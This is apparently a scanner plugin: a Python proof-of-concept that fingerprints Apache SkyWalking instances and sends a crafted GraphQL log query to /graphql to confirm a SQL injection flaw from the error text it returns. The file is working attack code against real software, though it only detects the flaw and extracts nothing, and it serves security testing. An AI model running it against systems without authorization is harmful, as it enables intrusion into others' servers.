from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.high
        self.detail = """<https://github.com/Vulnmachines/ApacheSkywalking>
        
<https://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247485941&idx=1&sn=835c845cce9ce789ea577f6e02e12657&chksm=c1b3ce16f6c447002a697e0de9e7363329ea6f5d26ef9d8eaf2ca7346829527a4eb045878b02&mpshare=1&scene=1&srcid=102020NBEwUT8lCJIQsS0Uub&sharer_sharetime=1668247321178&sharer_shareid=2b2bdaea1a2309b44abb0f62378a166e#rd>"""
        self.name = "Apache Skywalking SQL注入"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "<title>SkyWalking</title>" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        url = urljoin(self.target, "/graphql")
        client = Http()
        client.url = url
        client.json = {
            "query": """query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}""",
            "variables": {
                "condition": {
                    "metricName": "sqli",
                    "state": "ALL",
                    "paging": {
                        "pageSize": 10
                    }
                }
            }
        }
        resp = client.json_post()
        if "errors" in resp.text and "statement" in resp.text and "SQLI" in resp.text:
            return True
        else:
            return False
